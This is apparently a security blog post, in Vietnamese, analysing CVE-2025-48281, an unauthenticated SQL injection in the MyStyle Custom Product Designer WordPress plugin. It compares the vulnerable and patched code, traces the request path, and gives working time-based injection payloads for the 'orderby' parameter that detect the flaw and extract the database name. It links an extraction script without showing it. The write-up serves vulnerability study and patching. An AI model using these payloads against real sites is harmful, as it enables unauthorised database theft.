---
title: CVE-2025-48281 
description: Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.
date: 2025-09-09 18:36:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **MyStyle Custom Product Designer** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **3.21.2**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-48281](https://www.cve.org/CVERecord?id=CVE-2025-48281)
- **Product**: [WordPress MyStyle Custom Product Designer Plugin](https://wordpress.org/plugins/mystyle-custom-product-designer)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: <= 3.21.1 
- **CVSS severity**:  High (9.3) 
- **Required Privilege**: Unauthenticated

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **MyStyle Custom Product Designer**:  v3.21.1(vul) v√† v3.21.2(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version
- **Actived WooCommerce plugin**: plugin b·∫Øt bu·ªôc **actived** tr∆∞·ªõc khi c√†i **MyStyle Custom Product Designer Plugin**, m·ªôt s·ªë h√†m trong **WooCommerce** s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.

## Analysis
Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ **GET** request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **includes/entities/class-mystyle-designmanager.php**

```php
public static function get_designs(
    $per_page = 250,
    $page_number = 1,
    WP_User $user = null
) {
    global $wpdb;

    // Add security WHERE clause.
    $where = self::get_security_where_clause( 'WHERE', $user );

    if ( ! empty( $_GET['orderby'] ) ) {
        $order  = ' ORDER BY ' . sanitize_text_field( wp_unslash( $_GET['orderby'] ) );
        $order .= ! empty( $_GET['order'] ) ? ' ' . sanitize_text_field( wp_unslash( $_GET['order'] ) ) : ' ASC';
    } else {
        $order = ' ORDER BY ms_design_id DESC';
    }
   
    $results = $wpdb->get_results(
        $wpdb->prepare(
            'SELECT * '
            . "FROM {$wpdb->prefix}mystyle_designs "
            . $where
            . $order
            . ' LIMIT %d
            OFFSET %d',
            array(
                $per_page,
                ( $page_number - 1 ) * $per_page,
            )
        ),
        'OBJECT'
    );
    // other logic
}
```
{: file="includes/entities/class-mystyle-designmanager.php v3.21.1" }

D·ªØ li·ªáu t·ª´ `$_GET['orderby']` ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng `sanitize_text_field()` v√† `wp_unslash()` m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c **lo·∫°i b·ªè k√Ω t·ª±** ho·∫∑c **escape chu·ªói**, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.

```php
public static function get_designs(
    $per_page = 250,
    $page_number = 1,
    WP_User $user = null
) {
    global $wpdb;

    // Add security WHERE clause.
    $where = self::get_security_where_clause( 'WHERE', $user );

       if ( ! empty( $_GET['orderby'] ) ) {
        $orderby = sanitize_text_field( wp_unslash( $_GET['orderby'] ) );
        $order   = ! empty( $_GET['order'] ) ? sanitize_text_field( wp_unslash( $_GET['order'] ) ) : 'ASC';
        
        // Validate order direction to prevent SQL injection.
        $allowed_orderby = array(
            'ms_design_id',
            'ms_title',
            'ms_access',
            'ms_email',
            'ms_date_created',
            'ms_date_modified',
        );
        $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : 'ms_design_id';

        $order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ), true ) ? $order : 'ASC';
        
        $order = ' ORDER BY ' . $orderby . ' ' . $order;
    } else {
        $order = ' ORDER BY ms_design_id DESC';
    }

    $results = $wpdb->get_results(
        $wpdb->prepare(
            'SELECT * '
            . "FROM {$wpdb->prefix}mystyle_designs "
            . $where
            . $order
            . ' LIMIT %d
            OFFSET %d',
            array(
                $per_page,
                ( $page_number - 1 ) * $per_page,
            )
        ),
        'OBJECT'
    );
    // other logic
}
```
{: file="includes/entities/class-mystyle-designmanager.php v3.21.2" }

B·∫£n v√° s·ª≠ d·ª•ng **while list** `$allowed_orderby` ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã `orderby` kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh `'ms_design_id'` => ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.

![patch diff](assets/img/posts/2025-09-09-CVE-2025-48281/patch_diff.png)

### How it work?
L·ªó h·ªïng n·∫±m trong h√†m `get_designs` c·ªßa class `MyStyle_DesignManager` thu·ªôc file **includes/entities/class-mystyle-designmanager.php**. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `get_designs` trong th∆∞ m·ª•c ch·ª©a plugin.

üëâ `get_designs` ƒë∆∞·ª£c g·ªçi trong `get_items`, `init_index_request` v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m

![Search 1](assets/img/posts/2025-09-09-CVE-2025-48281/search_1.png)

V√¨ ƒë√¢y l√† l·ªói h·ªïng **unauthenticated** n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.

#### get_items() Function

`get_items` n·∫±m trong class `MyStyle_Wp_Rest_Api_Design_Controller` thu·ªôc file **includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php**

![search 2](assets/img/posts/2025-09-09-CVE-2025-48281/search_2.png)

ƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m `get_designs` kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. `get_items` ƒë∆∞·ª£c h√†m `register_routes` trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m `register_rest_route()` trong WordPress.

```php
public function register_routes() {
    $version   = '2';
    $vendor    = 'wc-mystyle';
    $namespace = $vendor . '/v' . $version;
    $base      = 'designs';
    register_rest_route(
        $namespace, '/' . $base, array(
            array(
                'methods'             => WP_REST_Server::READABLE, // GET
                'callback'            => array( $this, 'get_items' ),
                'permission_callback' => array( $this, 'get_items_permissions_check' ),
                'args'                => array(),
            )
        )
    )
    // other logic
}
```
{: file="includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1" }

Tuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m `get_items_permissions_check`, ta c·∫ßn ph·∫£i bi·∫øt **anonymoust user** c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng.
T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `get_items_permissions_check`.

![search 3](assets/img/posts/2025-09-09-CVE-2025-48281/search_3.png)

üëâ `get_items_permissions_check` g·ªçi ƒë·∫øn `wc_rest_check_manager_permissions` ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi `$object = 'settings'`. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a `wc_rest_check_manager_permissions` trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.

![search 4](assets/img/posts/2025-09-09-CVE-2025-48281/search_4.png)

- `wc_rest_check_manager_permissions` ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin **WooCommerce**
- `settings` mapping th√†nh `manage_woocommerce`
- G·ªçi `current_user_can( 'manage_woocommerce' )` ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user => Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn **manage_woocommerce**).

üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m `get_items` => khai th√°c h√†m t·ª´ h√†m `init_index_request`

#### init_index_request() Function

`init_index_request` n·∫±m trong class `MyStyle_Design_Profile_Page` thu·ªôc file **includes/pages/class-mystyle-design-profile-page.php**

![search 5](assets/img/posts/2025-09-09-CVE-2025-48281/search_5.png)

ƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m `get_designs` kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau.
`init_index_request` ƒë∆∞·ª£c h√†m `init` trong c√πng class g·ªçi.

```php
public function init() {
    // Check if the current page is /designs
    if ( ! self::is_current_post() ) {
        return;
    }

    // other logic
    $design_id = self::get_design_id_from_url();

    // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn => kh√¥ng quan t√¢m 
    if( isset( $_POST['delete_design_nonce'] ) && wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) {
        
        $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ;
        if ( $design ) {
            // Check if the user is the owner of the design or an admin.
            if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this->user->ID, $design_id ) ) {
                // restrict the design access to 2 (deleted).
                $design->set_access( 2 );
                MyStyle_DesignManager::persist( $design );
                $this->delete_design_success_message = 'Design has been successfully deleted.';
            }
        }
    }

    if ( false === $design_id || preg_match( '/page/', $design_id ) ) {
        $design_profile_page->init_index_request();
    } else {
        $design_profile_page->init_design_request( $design_id );
    }
}
```
{: file="includes/pages/class-mystyle-design-profile-page.php v3.21.1" }

ƒê·ªÉ `init_index_request` ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán `if` ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt `$design_id` l√† g√¨, t√¨m ki·∫øm h√†m `get_design_id_from_url` trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho `$design_id` 

```php
public static function get_design_id_from_url() {
    // Try the query vars ( ex: &design_id=10 ).
    $design_id = get_query_var( 'design_id' );
    if ( preg_match( '/page/', $design_id ) ) {
        $design_id = false;
    } elseif ( empty( $design_id ) ) {
        // ---------- try at /designs/10. --------
        // phpcs:ignore
        $path = $_SERVER['REQUEST_URI'];

        // Get the design profile page's WP_Post slug.
        /* @var $post \WP_Post phpcs:ignore */
        $post = get_post( self::get_id() );
        $slug = $post->post_name;

        $pattern = '/^.*\/' . $slug . '\/([\d]+)/';
        if ( preg_match( $pattern, $path, $matches ) ) {
            $design_id = $matches[1];
        } else {
            $design_id = false;
        }
        // -------------------------------------
    }

    return $design_id;
}
```
{: file="includes/pages/class-mystyle-design-profile-page.php v3.21.1" }

üëâ H√†m n√†y l·∫•y `design_id` t·ª´ **url** n√™n khi kh√¥ng th√™m n√≥ v√†o **url** khi g·ª≠i request => `if` x·∫£y ra => `init_index_request` ƒë∆∞·ª£c g·ªçi.

Quay tr·ªü l·∫°i h√†m `init`, n√≥ ƒë∆∞·ª£c g·ªçi trong `__construct` c·ªßa c√πng class.

```php
public function __construct() {
    // other logic
    add_action( 'init', array( &$this, 'rewrite_rules' ) );
    add_action( 'template_redirect', array( &$this, 'init' ) );
}
```
{: file="includes/pages/class-mystyle-design-profile-page.php v3.21.1" }

`init` l√† callback g·∫Øn v√†o hook `template_redirect`: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template **th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát**.

Ph√≠a tr√™n hook `template_redirect` trong `__construct` c√≤n c√≥ hook `init`, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback `rewrite_rules`:

```php
public function rewrite_rules() {
    // Flush rewrite rules for newly created rewrites.
    flush_rewrite_rules();

    add_rewrite_rule(
        'designs/([a-zA-Z0-9_-].+)?$', // designs/{slug}
        'index.php?pagename=designs&design_id=$matches[1]',
        'top'
    );
}
```

H√†m n√†y th√™m route `/designs/{id}` ƒë·ªÉ load trang `designs` v√† truy·ªÅn bi·∫øn `design_id`.

üëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o `/designs/`:

- Callback `rewrite_rules` ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load `/index.php?pagename=designs&design_id=`. 
- `design_id` kh√¥ng c√≥ gi√° tr·ªã n√™n `get_design_id_from_url` ƒë∆∞·ª£c g√°n cho `$design_id` s·∫Ω l√† false => ƒëi·ªÅu ki·ªán `false === $design_id` x·∫£y ra khi·∫øn `init_index_request` trong kh·ªëi `if` ƒë∆∞·ª£c g·ªçi.
- `init_index_request` g·ªçi ƒë·∫øn `get_designs`
- `get_designs` l·∫•y tr·ª±c ti·∫øp `orderby` t·ª´ **GET** request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi 

![Chart](assets/img/posts/2025-09-09-CVE-2025-48281/chart.png)

## Exploit
### Detect SQLi

G·ª≠i **GET request** ch·ª©a payload SQLi.

```http
GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:

```sql
SELECT * FROM wp_mystyle_designs  WHERE ms_access = 0  ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25
				OFFSET 0
```

![time response](assets/img/posts/2025-09-09-CVE-2025-48281/time_resp.png)

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => payload ho·∫°t ƒë·ªông.

> Trong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau `SLEEP`. V√¨ developer ƒë√£ enter khi·∫øn **OFFSET** xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói.
{: .prompt-info }

![debug](assets/img/posts/2025-09-09-CVE-2025-48281/debug.png)

Cu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:

```sql
SELECT * FROM wp_mystyle_designs  WHERE ms_access = 0  ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25				
OFFSET 0
```

### Get First Letter of Database Name
ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi **SQLi payload**:

```http
GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`('w')

S·ª≠ d·ª•ng hex encoding `w` th√†nh `0x77` v√¨ `orderby` ƒë∆∞·ª£c l·∫•y t·ª´ **GET** request trong n√™n b·ªã escape b·ªüi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

### Automatic Extraction
D·ª±a tr√™n kƒ© thu·∫≠t **Timebased SQLi** ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.

[Script Here](https://github.com/w41bu1/w41bu1.github.io/blob/main/assets/code/posts/2025-09-09-CVE-2025-48281/script.py)

## Conclusion
L·ªó h·ªïng **CVE-2025-48281** trong plugin WordPress **MyStyle Custom Product Designer** tr∆∞·ªõc phi√™n b·∫£n **3.21.2** xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

B·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.

**Key takeaways**:
- Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.
- Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.
- Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress MyStyle Custom Product Designer Plugin <= 3.21.1 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability)